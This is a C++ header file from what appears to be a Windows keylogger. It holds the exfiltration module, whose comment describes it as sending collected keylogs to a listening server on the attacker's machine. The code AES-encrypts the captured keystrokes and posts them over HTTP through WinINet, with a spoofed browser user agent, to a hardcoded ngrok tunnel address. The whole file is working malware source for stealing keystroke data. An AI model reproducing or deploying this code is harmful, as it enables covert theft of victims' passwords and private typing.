#ifndef EXFILTRATE_H
#define EXFILTRATE_H

#pragma comment(lib, "wininet.lib")

#include <fstream>
#include <vector>
#include <string>
#include <Windows.h>
#include <wininet.h>
#include <iostream>
#include "IO.h"
#include "Timer.h"
#include "Auxiliary.h"

/*

This header file will include the functionality used to send collected keylogs out to the listening
server on the attacker's machine using a built-in Windows API function that sends http post requests

*/

namespace Exfiltrate
{
	// Method prototypes for improved readability

	bool exfilLogs(std::string keyLogToExfil);
	bool sendHttpPOST(std::string &httpServerP, std::string &postBodyP);

	bool exfilLogs(std::string keyLogToExfil)
	{
		// Temp disabling the abiity to exfil from a file in favor of exfil direct from program variable

		/*
		
		std::ifstream inFile;
		inFile.open(pathToLogFile); //open the input file

		std::stringstream strStream;
		strStream << inFile.rdbuf(); //read the file
		std::string str = strStream.str(); //str holds the content of the file
		
		*/

		Auxiliary::DateTime dateTime;
		std::ostringstream formattedData;

		formattedData << "[" << dateTime.getDTString("/", " ", ":") << "]" << "   " << keyLogToExfil;

		std::string sendData = "data=";
		
		sendData += Transformer::aesEncrypt(formattedData.str());
		sendData += Transformer::getIV();

		// The variable httpServerAddress must be set to your ngrok tunnel address in order to properly recieve logs over the net
		// Be sure to NOT put in the http:// portion into the variable, just the xyz.ngrok.io

		std::string httpServerAddress = "e88c-73-32-226-14.ngrok.io";

		if (sendHttpPOST(httpServerAddress, sendData))
		{
			return true;
		}
		else
		{
			return false;
		}
		
	}

	bool sendHttpPOST(std::string &httpServerP, std::string &postBodyP)
	{
		std::wstring tmp1 = std::wstring(postBodyP.begin(), postBodyP.end());
		LPCWSTR postBody = tmp1.c_str();
		std::wstring postData = postBody;

		std::wstring headers = L"Content-Type: application/x-www-form-urlencoded; charset=utf-8";

		std::wstring tmp2 = std::wstring(httpServerP.begin(), httpServerP.end());
		LPCWSTR httpServer = tmp2.c_str();

		HINTERNET hSession = InternetOpen(
			L"Mozilla/5.0",
			INTERNET_OPEN_TYPE_PRECONFIG,
			NULL,
			NULL,
			0);

		HINTERNET hConnect = InternetConnect(
			hSession,
			httpServer, //TARGET SERVER
			0,
			L"",
			L"",
			INTERNET_SERVICE_HTTP,
			0,
			0);

		HINTERNET hHttpFile = HttpOpenRequest(
			hConnect,
			L"POST", //HTTP METHOD
			L"/", //URI
			NULL,
			NULL,
			NULL,
			0,
			0);

		if (HttpSendRequest(hHttpFile, headers.c_str(),
			headers.length(), (LPVOID)postData.c_str(),
			postData.length() * sizeof(wchar_t)))
		{
			return true;
		}
		else
		{
			return false;
		}
	}
}

#endif 